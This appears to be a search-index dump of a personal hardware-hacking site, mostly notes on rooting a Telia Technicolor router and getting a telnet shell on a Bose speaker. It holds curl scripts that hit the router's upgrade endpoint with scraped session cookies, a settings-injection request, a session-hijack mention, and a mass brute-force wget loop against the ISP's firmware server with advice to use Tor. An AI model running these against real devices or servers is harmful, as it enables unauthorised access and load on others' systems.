(grunt in this example):"},{"location":"hacking/chromebook/acer_chromebook_c740/#very-good-explanation-from-raymond-genovese-how-to-reset-the-pins-so-i-decided-to-include-this-in-this-repo","text":"https://forum.allaboutcircuits.com/threads/resetting-a-bios-chip-very-manually.153848/#post-1322752 \"Resetting that chip is very simple. Find the reset pin. It is active low. Connect that pin to ground for at least a us. Of course the chip has to be powered and you have to make sure that you are not applying a ground signal to the pin if it is being held high, unless the circuitry can support that. A reset returns the chip to the power on state. A reset does not erase the flash memory. On the 8-pin package it is a little more complicated and it depends on some other factors. In fact, the pin that you would use to perform the reset can be programed as an I/O pin and not a reset pin. I know your question specifically asks if you should do that with or without power and I am intentionally avoiding answering that at this point except to say that if no power is on anywhere, you will not be resetting the chip. My guess is that you do not really want to reset the chip; you want to reset a portion of your BIOS that is stored on the chip and you hope that you can do that by simply resetting the chip. It is possible that when the system boots up, it looks at that pin/line (which again can be configured as I/O) and if it reads as GND while it is booting up (i.e., it would normally be high); it interrupts the normal boot and executes special code that re-writes dedicated areas of memory that hold configuration data (exactly the kind of data that can appear to brick the machine if it gets corrupted). That could, therefore, be a way that a technician might be able to restore the factory defaults if the code exists to do so. That is possible, but you would need to make certain it is the case and not just hope it is because it is also possible to do additional damage, especially if you very little experience with such matters. In my opinion, it is not possible to clear the BIOS by resetting the chip alone. I had an unpleasant experience attempting to help someone who was following such a train of thought (with a different computer) and it was a one way trip. I regret that I ever had attempted to help him at all. But that was my choice and I am willing to help you if I can, as are many others on here. So, to cut to the chase, how did the computer get trashed and what is it doing or not doing? Why did you decide that you needed to perform the reset to reinstall the factory BIOS settings? Have you already tried any of the many fixes on YouTube and the like?\"","title":"Very good explanation from Raymond Genovese how to reset the pins so I decided to include this in this repo:"},{"location":"hacking/chromebook/acer_chromebook_c740/#requirements","text":"A chromebook device, soic 8 clip and a ch341 eeprom/bios reader","title":"Requirements"},{"location":"hacking/chromebook/acer_chromebook_c740/#contact","text":"If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu","title":"Contact"},{"location":"hacking/chromebook/acer_chromebook_c740/#web","text":"Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman","title":"Web"},{"location":"hacking/radio/","text":"radio radio hacking stuff will be found here","title":"radio"},{"location":"hacking/radio/#radio","text":"radio hacking stuff will be found here","title":"radio"},{"location":"hacking/radio/boose_soundtouch/","text":"Bose Soundtouch 'Hackers can remotely control thousands of Sonos and Bose speakers' 'Security experts at Trend Micro have demonstrated that certain models of Sonos and Bose speakers are affected by vulnerabilities that could allow attackers to hijack them.' https://securityaffairs.co/wordpress/67292/hacking/hacking-speakers.html So how do we hack them? See below! :-) While USB cable is plugged in browse to: http://203.0.113.1:17008/update.html Choose your \"Update.stu\" file and hit upload Upgrade will take ~3 minutes, once done browse to your bose soundtouch devices IP address and hit upload and the once done, do as below: A simple portscan gives us the result below: (IMPORTANT: USB Cable must be plugged in) thinkpad /home/wuseman # nmap -p0- -T5 203.0.113.1 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 03:54 CET Nmap scan report for 203.0.113.1 Host is up (0.0066s latency). Not shown: 65515 closed ports PORT STATE SERVICE 82/tcp open xfer 8080/tcp open http-proxy 8090/tcp open opsmessaging 8091/tcp open jamlink 17000/tcp open unknown 17004/tcp open unknown 17005/tcp open unknown 17008/tcp open unknown 17018/tcp open unknown 30030/tcp open unknown 30031/tcp open unknown 40002/tcp open unknown 40003/tcp open unknown 40030/tcp open unknown 40031/tcp open unknown 44149/tcp open unknown 49240/tcp open unknown 49916/tcp open unknown 49935/tcp open unknown 57376/tcp open unknown 59994/tcp open unknown MAC Address: B2:D1:XB:5E:87:65 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 4.13 seconds So now we gonna try to connect to all ports and see if they are available to connect to wuseman@thinkpad ~ $ telnet 203.0.113.1 82 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. GET /index.html Connection closed by foreign host. wuseman@thinkpad ~ $ telnet 203.0.113.1 8080 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. get /update.html GET /index.html Connection closed by foreign host. Same result on 8090 and 8091, but on 17000 we got a shell, bingo!! wuseman@thinkpad ~ $ telnet 203.0.113.1 17000 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. -> A video while playing around with some commands CONTACT If you have problems, questions, ideas or suggestions please contact me on wuseman@nr1.nu WEB SITE Visit our homepage for the latest info and updated tools: @wuseman","title":"boose soundtouch"},{"location":"hacking/radio/boose_soundtouch/#bose-soundtouch","text":"","title":"Bose Soundtouch"},{"location":"hacking/radio/boose_soundtouch/#hackers-can-remotely-control-thousands-of-sonos-and-bose-speakers","text":"'Security experts at Trend Micro have demonstrated that certain models of Sonos and Bose speakers are affected by vulnerabilities that could allow attackers to hijack them.' https://securityaffairs.co/wordpress/67292/hacking/hacking-speakers.html So how do we hack them? See below! :-)","title":"'Hackers can remotely control thousands of Sonos and Bose speakers'"},{"location":"hacking/radio/boose_soundtouch/#while-usb-cable-is-plugged-in-browse-to","text":"http://203.0.113.1:17008/update.html","title":"While USB cable is plugged in browse to:"},{"location":"hacking/radio/boose_soundtouch/#choose-your-updatestu-file-and-hit-upload","text":"Upgrade will take ~3 minutes, once done browse to your bose soundtouch devices IP address and hit upload and the once done, do as below:","title":"Choose your \"Update.stu\" file and hit upload"},{"location":"hacking/radio/boose_soundtouch/#a-simple-portscan-gives-us-the-result-below-important-usb-cable-must-be-plugged-in","text":"thinkpad /home/wuseman # nmap -p0- -T5 203.0.113.1 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 03:54 CET Nmap scan report for 203.0.113.1 Host is up (0.0066s latency). Not shown: 65515 closed ports PORT STATE SERVICE 82/tcp open xfer 8080/tcp open http-proxy 8090/tcp open opsmessaging 8091/tcp open jamlink 17000/tcp open unknown 17004/tcp open unknown 17005/tcp open unknown 17008/tcp open unknown 17018/tcp open unknown 30030/tcp open unknown 30031/tcp open unknown 40002/tcp open unknown 40003/tcp open unknown 40030/tcp open unknown 40031/tcp open unknown 44149/tcp open unknown 49240/tcp open unknown 49916/tcp open unknown 49935/tcp open unknown 57376/tcp open unknown 59994/tcp open unknown MAC Address: B2:D1:XB:5E:87:65 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 4.13 seconds","title":"A simple portscan gives us the result below: (IMPORTANT: USB Cable must be plugged in)"},{"location":"hacking/radio/boose_soundtouch/#so-now-we-gonna-try-to-connect-to-all-ports-and-see-if-they-are-available-to-connect-to","text":"wuseman@thinkpad ~ $ telnet 203.0.113.1 82 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. GET /index.html Connection closed by foreign host. wuseman@thinkpad ~ $ telnet 203.0.113.1 8080 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. get /update.html GET /index.html Connection closed by foreign host. Same result on 8090 and 8091, but on 17000 we got a shell, bingo!! wuseman@thinkpad ~ $ telnet 203.0.113.1 17000 Trying 203.0.113.1... Connected to 203.0.113.1. Escape character is '^]'. ->","title":"So now we gonna try to connect to all ports and see if they are available to connect to"},{"location":"hacking/radio/boose_soundtouch/#a-video-while-playing-around-with-some-commands","text":"","title":"A video while playing around with some commands"},{"location":"hacking/radio/boose_soundtouch/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on wuseman@nr1.nu","title":"CONTACT"},{"location":"hacking/radio/boose_soundtouch/#web-site","text":"Visit our homepage for the latest info and updated tools: @wuseman","title":"WEB SITE"},{"location":"hacking/routers/","text":"router router hacking related stuff will be found here","title":"router"},{"location":"hacking/routers/#router","text":"router hacking related stuff will be found here","title":"router"},{"location":"hacking/routers/technicolor_dga4330ts/","text":"Technicolor DGA4330TS Welcome DGA4330TS to my collections of Telia devices I now have all the units they have delivered to customers :) A small part of my collection Well, let us keep topic @DGA4330TS Technicolor DGA4330TS Board, overview Board (Serial Console Pins) Boot log will be uploaded later Black = GND Green = TRX Intro Never let the fear of striking out keep you from playing the game. New Device, New Firmware I will spend exactly as many hours as it takes to access the source code you refuse to share, you are violating the GPL v1,2 and 3 and since you wont share I will spend as many days it is needed to get what what I asked for in 14 months now. TeliaCompany is partly owned by the Swedish state and they do this, it's bad but who cares, if they dont I dont. I have recently received the router and have not had time to check so much so I will update this repot often in the near future. I have not managed to get SSH access (** yet **) and there is basically no information about the router or its board anywhere so I share what I have found and we will help find a way to root, cool? :) The router runs newer firmware than all previous Technicolor TG * models, these are upgraded up to today's date even and they have done very well when they tried to keep us without info but after another hacking race (70-75h just sitting here and trying to get some fucking root without sleep) I found some intresting things and maybe its sueful for anyone who is motivated to get root access asap, but remember - I do all this 100% for free without donations or money or anything that involves cash the only I asking for is for sharing knowledge, if you find anything useful or got root access, please let me (us) know or if you have any other questions just open an issue and we can discuss stuff togheter (please dont send email, we are a community, right?), k, thx? This is what I found so far, the repo will be updated and will be sorted with time so sorry if the readme is a bit messy but I share what may be of interest for you(others) Main Card (gateway.lp) Since there is NO info online about this board I thought it would be impossible to find the rbi files especially when they are locked out /modals/logviewer-modal.lp and you wont get access to it anymore as before, and we have no tcpdump modal in this router. The router has a setup like Sagemcom F@st 5370 (ya, that sucks , for us!) - An lxc enviroment, the default gateway ip for DGA4330TS is: 192.168.1.1 Telia X2 (LXC) is available on: 192.168.1.154 Surprised? How could you miss that? Nah, thats not so wierd since it is hidden - You wont find this connection in the webui, you wont find it in an arp scan neither tbh and neither an localnetwork scan. No bullshit, open a shell and ping '192.168.1.154' and you will see that something is running on on this ip and yeah, thats the chroot container that is up-n-running, when you VBNT-7 DGA4330TS board is VBNT-7 (no public firmware for this has been found as mentioned) Well, we jump to what info I have found and can share that I have not found elsewhere so hopefully it might help someone who helps me who helps everyone ;) Two releases has been released for this firmware and board: * 2019 - 18.3.0357-2981033-20190820161731 * 2021 - 18.3.0710-2981008-20210218193114 (Current: 2021-12-19) And now to the good part, I found the firmware for latest version and it is available for everyone online and there is no requirements for download the firmware from their fucking slow vlan server so, go download the firmware if you feel for it until they remove them (if they reading this) * From VLAN (default ).............: http://131.116.22.230:80/1830710-7-2981008.rbi * From NET (I found this one).............: https://rgw.teliacompany.com:7547/1830710-7-2981008.rbi I have no clue why they not using this URL, the default one is set in TSBoot.jar ^ Some random output were I found there is a /dev/mtd7 partition and there is only one bank installed, it is possible to failsafe boot this router but it wont boot another bank it will enter TFTP mode instead after 4 restarts: nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nssessio.c;nsRegisterName();555--->ND failed to register the name ssessio.c;nsBindNetBios();681---> Name Registration Failed nscommon.c;createCommonDatagramSocket();402--->Can't bind to port nscommon.c;nsInit();252--->Unable to create the common datagram socket nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nssessio.c;nsRegisterName();555--->ND failed to register the name nssessio.c;nsBindNetBios();681---> Name Registration Failed nscommon.c;createCommonDatagramSocket();402--->Can't bind to port nscommon.c;nsInit();252--->Unable to create the common datagram socket ;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 Snscommon.c;ending event FaultMgmt.Event Connecting to server external IP address is 192.168.1.211 Connected to server, starting transaction. external IP address is 192.168.1.211 Sending event FaultMgmt.Event Empty Post Instance **lxc::lxc_ee** pid 9386 not stopped on **SIGTERM**, sending **SIGKILL** instead port 7(veth1MB275) entered disabled state device veth1MB275 left promiscuous mode port 7(veth1MB275) entered disabled state nscommon.c;nsInit();252--->Unable to create the common datagram socket DHCPACK(br-lan) 192.168.1.153 22:b0:01:e2:45:6f TeliaLXC W unlink(\"//var/run/lcm_ipc_lxc_ee/ubus.sock\"): No such file or directory Instance lxc::lxc_ee pid 9468 not stopped on SIGTERM, sending SIGKILL instead unlink(\"**//var/run/lcm_ipc_lxc_ee/ubus.sock**\"): No such file or directory DHCPACK(br-lan) 192.168.1.153 **TeliaLXC** exiting on signal 15 Instance lxc::lxc_ee pid 7585 not stopped on SIGTERM, sending SIGKILL instead /etc/rc.d/K11lxc.mount: Unlocking **/dev/mtd7** ... /etc/rc.d/K11lxc.mount: Erasing **/dev/mtd7** ... lxc_ee_ubp[9730]: exiting on signal 15 lxc_ee_ubp[9730]: halt And after this I never was able to get into this state again, ahwell, lets continue: Of course, I have tried to export config since that is possible on the old routers (lol) without being admin or engineer or in telia role but they have covererd this also in the last upgrade so there is not even possible to export anything but since upgradfw is possible then we can upload files of course and I have tried that also of course but without any success and got a 401 error: 401 Authorization Required #!/bin/bash SRC_URL = \"http://192.168.1.1/modals/\" SRC_MAIN = \"http://192.168.1.1/gateway.lp\" SRC_MODAL = \"gateway-modal.lp?action\" SRC_TOKEN = $( curl -sL --insecure 'https://192.168.10.1/login.lp?action=getcsrf) SRC_SESSION=$(curl -sL --insecure ' https://192.168.10.1/login.lp?action = getcsrf -v 2 > & 1 | grep -E 'sessionID' | cut -d '=' -f2 | cut -d ';' -f1 ) FW_LENGTH = \"\" 24290177 \" curl \" http:// ${ SRC_URL } / ${ SRC_MODAL } = upgradefw \" \\ -X 'POST' \\ -H 'Connection: keep-alive' \\ -H \" Content-Length: ${ FW_LENGTH } \" \\ -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaXgsI290qEt5B0Xf' \\ -H 'User-Agent: KreaTVWebKit/600 (Motorola STB Arris Motorola v; Fuckign Bl3ckH4ts, st0p pl4nt b4kdoors,; Linux; 5305; F0ck Ur-Sysl0g-ASsh0les / v1.0)' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\ -H \" Referer: ${ SRC_MAIN } \" \\ -H 'Cookie: sessionID= ${ SRC_SESSION } ' --compressed Respons: < html > < head >< title > 401 Authorization Required </ title ></ head > < body bgcolor = \"white\" > < center >< h1 > 401 Authorization Required </ h1 ></ center > < hr >< center > nginx </ center > </ body > </ html > ** If we change the action from upgradefw -> banksize we get a positive response: { \"success\" : \"true\" , \"banksize\" : \"48627712\" } But this is interesting and wierd imo - I also tried file-upgradwfw in developer console and I got the response below and this is how I found the firmware name, I didnt include anything more then the val line - Please notise the last 2 digits ( 12 ) - I wasnt able to find this firmware and I think its just a fake name or something, whatever then I created then telia-firmware script that can be found here - NOTICE - *I never used this script personally I just created the script for a friend so dont blame me for anything idiots @telia ! As mentioned at topic, if you followed the license things would be much easier for everyone) $ ( \"#file-upgradefw\" ). val () 07 : 49 : 10.630 'C:\\fakepath\\1830710-7-2981012.rbi' No idea what that fakepath is from, I run Linux and have no C: partition so yeh, dunno - Maybe there is a reason for this I'm just mentioning it There is many new things, for example - The router is refresing and checking for current role all the time, ahwell. if anyone is interested of the bruteforce-script but think its to slow, I agree I created it for the normal user but if you dont give a fuck like my friend that using my scripts then try this: for version in $( seq -w 000 99999 ) ; do echo https://rgw.teliacompany.com:7547/1830710-7-29 ${ version } .rbi ; done > /tmp/mega-bruteforce.txt ....now execute: parallel -a /tmp/mega-bruteforce.txt -j0 -N252 wget --spider --show-progress --progress = bar:force {} \\; It will send 252 requests at once so after ~2.7 seconds you spidered 1000 firmware versions and if there is a match, it will download the firmware. Use vpn or tor for your own safety Per default 252 is default, for raise limits you can do: ulimit -n <NR> OR Edit: /etc/security/limits.conf, example see below: admin_user_ID soft nofile 32768 admin_user_ID hard nofile 65536 Whatever, this is not the right place to go deeper in this topic, if you are curios about this read manual, see examples with below command: LESS = +/EXAMPLES man limits.conf The Bridge Card and ETH Linespeed card is new Stuff that is new and not included in older models that I have found and might be intresting for someone I hope: [ error ] 6180 #0: *4 open() \"/www/api/reload\" failed (2: No such file or directory), client: 127.0.0.1, server: 127.0.0.1, request: \"GET /api/reload HTTP/1.1\", host: \"localhost:55555\" Curl It is possible to inject hidden settings, ntp server is set in /etc/config/system so it might be possible to change other values as well. curl 'http://192.168.1.100/modals/gateway-modal.lp' \\ -H 'Connection: keep-alive' \\ -H 'Accept: text/html, */*; q=0.01' \\ -H 'DNT: 1' \\ -H 'X-Requested-With: XMLHttpRequest' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' \\ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\ -H 'Origin: http://192.168.1.100' \\ -H 'Referer: http://192.168.1.100/gateway.lp' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Cookie: sessionID=4514d437a748c46c63964259cda91055ce4887853e8d1689a24c215e75e88354' \\ --data-raw 'system_network_timezone=_DUMMY_&system_timezone=GMT0_timezone_Africa%2FAbidjan&action=SAVE&fromModal=YES&CSRFtoken=c7c237f206d264f03bcd562801111d161a1357f7a7dfdad53c62447763d8ed90' \\ --compressed \\ --insecure Firmware When I use binwalk and extracting the firmware file it says the file is MySQL MISAM filetype, I am unsure if this is a binwalk bug or not, output: binwalk -Me 2021 /1830710-7-2981008.rbi Scan Time: 2021 -12-28 15 :00:28 Target File: TECHNICOLOR_DGA4330TS/firmware/2021/1830710-7-2981008.rbi MD5 Checksum: e12622f04704425ea2c7cf52c80ec6db Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 8904736 0x87E020 MySQL MISAM compressed data file Version 11 14608824 0xDEE9B8 MySQL ISAM index file Version 8 /etc/rc.d/S90fhcd f hcd. f hcd.e na ble= 1 valida tes as bool wi t h true f hcd. f hcd. tls _cer t =/ t mp/cer ts /chai n .pem valida tes as f ile wi t h false f hcd. f hcd. tls _key=/ t mp/cer ts /key.pem valida tes as or( f ile , regex( \"engine\\:.*\" )) wi t h false f hcd. f hcd. tls _cas t ore=/ t mp/cer ts /ca valida tes as direc t ory wi t h false f hcd. f hcd.i nterfa ce [ 0 ] =la n valida tes as lis t (s tr i n g) wi t h true f hcd. f hcd.loglevel is u nset a n d de faults t o ra n ge( 0 , 7 ) ( null ) core-lcm I masked the URL here since I dont know what its about atm: Dispa t chi n g s tart sig nal I n i t ial s tate s tart LCM comple te _upda te LCM comple te _upda te GET : h tt ps : //acs.file.abc.example.json/ipk/hw/ U na ble t o fet ch t he apps fr om t he backe n d : Backe n d error : Curl error : [ 6 ] Error Failed 'Dispa t chi n g s tart sig nal ' : Backe n d error : Curl error : [ 6 ] Error. 8 a tte mp ts le ft . Nex t a tte mp t i n 5 seco n ds. LCM cha n ged s tatus core - lcm , i nstalle d , 3.2.18 LCM cha n ged s tatus core - wa t chdog , i nstalle d , 2.1.4 APP_TRACE : bad address 'acs. tel ia.com' Eve nt lis ten i n g selec t re turne d error : I nterru p te d sys te m call I nstall i n g prebuil t ipks i nstea d : Do ne i nstall i n g prebuild ipks Kernel Stuff: sfpPhy_probe : Entering the functio , client -> addr = 0x50 i2c i2c -0 : new_device : Instantiated device sff8472_i2c at 0x50 sfpPhy_probe : Entering the functio , client -> addr = 0x51 i2c i2c -0 : new_device : Instantiated device sff8472_i2c at 0x51 jffs2 : notice : ( 4924 ) check_node_data : wrong data CRC in data node at 0x0488d978 : read 0x958e2b1e , calculated 0xf0ebf64b . parsing configuration nfq_init done nfq_thread entering main loop Random stuff Things I have personally no clue what it is really, adding below for myself to read more about. Notice the listen port\u2026 /etc/rc.d/S70iqos: iqctl: invalid command mosquitto version 1.5 starting mosquitto version 1.5 starting /etc/rc.d/S79sscert: sscert: The certificate was correctly generated The certificate was correctly generated /etc/rc.d/S80mosquitto: Generating mosquitto config file in /tmp/mosquitto.generated.conf Config loaded from /tmp/mosquitto.generated.conf. Notice : Check the listen port\u2026? Opening ipv4 listen socket on port 8883. Error: Unable to load server certificate \"/tmp/certs/chain.pem\". Check certfile. Opening ipv6 listen socket on port 8883. Error: Unable to load server certificate \"/tmp/certs/chain.pem\". Check certfile. Notice: \u2013 Check, this is from lxc on 192.168.1.153: client: 127.0.0.1, server: 127.0.0.1, request: \"GET /api/reload HTTP/1.1\", host: \"localhost:55555\" - * Notice* \u2013 TeliaLXC \u2013 It is on this hidden net the router trying to get the firmware on 131.116.22.230:80 OR acs.telia.com but the address is bad? So, we jump to? - Why the heck are they using curl when its not working? lol - Devbice isretrying every 60 seonds fpr 50 attempts until its halt. Notice, this was how I got all the logs and when I tried to login via session hijack it changed the user back to Administrator and curent_role=admin : 6180#0: *11 [lua] session.lua:103: changeUser(): changing user to Administrator, client: 192.168.1.10, server: localhost, request: \"POST /authenticate Unable to fetch the apps from the backend: Backend error: Curl error: [6] Error Failed 'Dispatching start signal': Backend error: Curl error: [6] Error. 8 attempts left. Next attempt in 5 seconds. DHCPACK(br-lan) 192.168.1.153 22:b0:01:e2:45:6f TeliaLXC Couldn't find systeminfo section: Device config error: Configurator error: Configurator error: No section named 'systeminfo' Changelog Versions changelog . Authors: wuseman < wuseman@nr1.nu > License This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details Contact If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . To be continued, stay tuned!","title":"technicolor dga4330ts"},{"location":"hacking/routers/technicolor_dga4330ts/#technicolor-dga4330ts","text":"","title":"Technicolor DGA4330TS"},{"location":"hacking/routers/technicolor_dga4330ts/#welcome-dga4330ts-to-my-collections-of-telia-devices","text":"I now have all the units they have delivered to customers :)","title":"Welcome DGA4330TS to my collections of Telia devices"},{"location":"hacking/routers/technicolor_dga4330ts/#a-small-part-of-my-collection","text":"Well, let us keep topic @DGA4330TS","title":"A small part of my collection"},{"location":"hacking/routers/technicolor_dga4330ts/#technicolor-dga4330ts_1","text":"","title":"Technicolor DGA4330TS"},{"location":"hacking/routers/technicolor_dga4330ts/#board-overview","text":"","title":"Board, overview"},{"location":"hacking/routers/technicolor_dga4330ts/#board-serial-console-pins","text":"Boot log will be uploaded later Black = GND Green = TRX","title":"Board (Serial Console Pins)"},{"location":"hacking/routers/technicolor_dga4330ts/#intro","text":"Never let the fear of striking out keep you from playing the game. New Device, New Firmware I will spend exactly as many hours as it takes to access the source code you refuse to share, you are violating the GPL v1,2 and 3 and since you wont share I will spend as many days it is needed to get what what I asked for in 14 months now. TeliaCompany is partly owned by the Swedish state and they do this, it's bad but who cares, if they dont I dont. I have recently received the router and have not had time to check so much so I will update this repot often in the near future. I have not managed to get SSH access (** yet **) and there is basically no information about the router or its board anywhere so I share what I have found and we will help find a way to root, cool? :) The router runs newer firmware than all previous Technicolor TG * models, these are upgraded up to today's date even and they have done very well when they tried to keep us without info but after another hacking race (70-75h just sitting here and trying to get some fucking root without sleep) I found some intresting things and maybe its sueful for anyone who is motivated to get root access asap, but remember - I do all this 100% for free without donations or money or anything that involves cash the only I asking for is for sharing knowledge, if you find anything useful or got root access, please let me (us) know or if you have any other questions just open an issue and we can discuss stuff togheter (please dont send email, we are a community, right?), k, thx? This is what I found so far, the repo will be updated and will be sorted with time so sorry if the readme is a bit messy but I share what may be of interest for you(others)","title":"Intro"},{"location":"hacking/routers/technicolor_dga4330ts/#main-card-gatewaylp","text":"Since there is NO info online about this board I thought it would be impossible to find the rbi files especially when they are locked out /modals/logviewer-modal.lp and you wont get access to it anymore as before, and we have no tcpdump modal in this router. The router has a setup like Sagemcom F@st 5370 (ya, that sucks , for us!) - An lxc enviroment, the default gateway ip for DGA4330TS is: 192.168.1.1 Telia X2 (LXC) is available on: 192.168.1.154 Surprised? How could you miss that? Nah, thats not so wierd since it is hidden - You wont find this connection in the webui, you wont find it in an arp scan neither tbh and neither an localnetwork scan. No bullshit, open a shell and ping '192.168.1.154' and you will see that something is running on on this ip and yeah, thats the chroot container that is up-n-running, when you","title":"Main Card (gateway.lp)"},{"location":"hacking/routers/technicolor_dga4330ts/#vbnt-7","text":"DGA4330TS board is VBNT-7 (no public firmware for this has been found as mentioned) Well, we jump to what info I have found and can share that I have not found elsewhere so hopefully it might help someone who helps me who helps everyone ;) Two releases has been released for this firmware and board: * 2019 - 18.3.0357-2981033-20190820161731 * 2021 - 18.3.0710-2981008-20210218193114 (Current: 2021-12-19) And now to the good part, I found the firmware for latest version and it is available for everyone online and there is no requirements for download the firmware from their fucking slow vlan server so, go download the firmware if you feel for it until they remove them (if they reading this) * From VLAN (default ).............: http://131.116.22.230:80/1830710-7-2981008.rbi * From NET (I found this one).............: https://rgw.teliacompany.com:7547/1830710-7-2981008.rbi I have no clue why they not using this URL, the default one is set in TSBoot.jar ^ Some random output were I found there is a /dev/mtd7 partition and there is only one bank installed, it is possible to failsafe boot this router but it wont boot another bank it will enter TFTP mode instead after 4 restarts: nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nssessio.c;nsRegisterName();555--->ND failed to register the name ssessio.c;nsBindNetBios();681---> Name Registration Failed nscommon.c;createCommonDatagramSocket();402--->Can't bind to port nscommon.c;nsInit();252--->Unable to create the common datagram socket nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nscommon.c;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 nssessio.c;nsRegisterName();555--->ND failed to register the name nssessio.c;nsBindNetBios();681---> Name Registration Failed nscommon.c;createCommonDatagramSocket();402--->Can't bind to port nscommon.c;nsInit();252--->Unable to create the common datagram socket ;nsReceiveResponseFromND();549--->Negative response: RCODE: 3 Snscommon.c;ending event FaultMgmt.Event Connecting to server external IP address is 192.168.1.211 Connected to server, starting transaction. external IP address is 192.168.1.211 Sending event FaultMgmt.Event Empty Post Instance **lxc::lxc_ee** pid 9386 not stopped on **SIGTERM**, sending **SIGKILL** instead port 7(veth1MB275) entered disabled state device veth1MB275 left promiscuous mode port 7(veth1MB275) entered disabled state nscommon.c;nsInit();252--->Unable to create the common datagram socket DHCPACK(br-lan) 192.168.1.153 22:b0:01:e2:45:6f TeliaLXC W unlink(\"//var/run/lcm_ipc_lxc_ee/ubus.sock\"): No such file or directory Instance lxc::lxc_ee pid 9468 not stopped on SIGTERM, sending SIGKILL instead unlink(\"**//var/run/lcm_ipc_lxc_ee/ubus.sock**\"): No such file or directory DHCPACK(br-lan) 192.168.1.153 **TeliaLXC** exiting on signal 15 Instance lxc::lxc_ee pid 7585 not stopped on SIGTERM, sending SIGKILL instead /etc/rc.d/K11lxc.mount: Unlocking **/dev/mtd7** ... /etc/rc.d/K11lxc.mount: Erasing **/dev/mtd7** ... lxc_ee_ubp[9730]: exiting on signal 15 lxc_ee_ubp[9730]: halt And after this I never was able to get into this state again, ahwell, lets continue: Of course, I have tried to export config since that is possible on the old routers (lol) without being admin or engineer or in telia role but they have covererd this also in the last upgrade so there is not even possible to export anything but since upgradfw is possible then we can upload files of course and I have tried that also of course but without any success and got a 401 error: 401 Authorization Required #!/bin/bash SRC_URL = \"http://192.168.1.1/modals/\" SRC_MAIN = \"http://192.168.1.1/gateway.lp\" SRC_MODAL = \"gateway-modal.lp?action\" SRC_TOKEN = $( curl -sL --insecure 'https://192.168.10.1/login.lp?action=getcsrf) SRC_SESSION=$(curl -sL --insecure ' https://192.168.10.1/login.lp?action = getcsrf -v 2 > & 1 | grep -E 'sessionID' | cut -d '=' -f2 | cut -d ';' -f1 ) FW_LENGTH = \"\" 24290177 \" curl \" http:// ${ SRC_URL } / ${ SRC_MODAL } = upgradefw \" \\ -X 'POST' \\ -H 'Connection: keep-alive' \\ -H \" Content-Length: ${ FW_LENGTH } \" \\ -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaXgsI290qEt5B0Xf' \\ -H 'User-Agent: KreaTVWebKit/600 (Motorola STB Arris Motorola v; Fuckign Bl3ckH4ts, st0p pl4nt b4kdoors,; Linux; 5305; F0ck Ur-Sysl0g-ASsh0les / v1.0)' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \\ -H \" Referer: ${ SRC_MAIN } \" \\ -H 'Cookie: sessionID= ${ SRC_SESSION } ' --compressed Respons: < html > < head >< title > 401 Authorization Required </ title ></ head > < body bgcolor = \"white\" > < center >< h1 > 401 Authorization Required </ h1 ></ center > < hr >< center > nginx </ center > </ body > </ html > ** If we change the action from upgradefw -> banksize we get a positive response: { \"success\" : \"true\" , \"banksize\" : \"48627712\" } But this is interesting and wierd imo - I also tried file-upgradwfw in developer console and I got the response below and this is how I found the firmware name, I didnt include anything more then the val line - Please notise the last 2 digits ( 12 ) - I wasnt able to find this firmware and I think its just a fake name or something, whatever then I created then telia-firmware script that can be found here - NOTICE - *I never used this script personally I just created the script for a friend so dont blame me for anything idiots @telia ! As mentioned at topic, if you followed the license things would be much easier for everyone) $ ( \"#file-upgradefw\" ). val () 07 : 49 : 10.630 'C:\\fakepath\\1830710-7-2981012.rbi' No idea what that fakepath is from, I run Linux and have no C: partition so yeh, dunno - Maybe there is a reason for this I'm just mentioning it There is many new things, for example - The router is refresing and checking for current role all the time, ahwell. if anyone is interested of the bruteforce-script but think its to slow, I agree I created it for the normal user but if you dont give a fuck like my friend that using my scripts then try this: for version in $( seq -w 000 99999 ) ; do echo https://rgw.teliacompany.com:7547/1830710-7-29 ${ version } .rbi ; done > /tmp/mega-bruteforce.txt ....now execute: parallel -a /tmp/mega-bruteforce.txt -j0 -N252 wget --spider --show-progress --progress = bar:force {} \\; It will send 252 requests at once so after ~2.7 seconds you spidered 1000 firmware versions and if there is a match, it will download the firmware. Use vpn or tor for your own safety Per default 252 is default, for raise limits you can do: ulimit -n <NR> 